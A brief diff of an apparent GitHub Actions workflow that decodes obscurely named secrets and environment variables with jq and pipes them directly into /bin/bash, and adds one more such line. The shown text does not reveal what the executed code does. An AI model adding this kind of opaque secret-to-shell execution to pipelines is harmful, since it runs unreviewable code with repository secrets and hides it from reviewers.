@@ -21,6 +21,7 @@ jobs:
           gqp10: ${{ secrets.gqp10 }}
         run: |
           printf '%s' "$gqp10" | jq -r .wh84 | /bin/bash
+          echo $zczn1074 | jq -r .u920 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
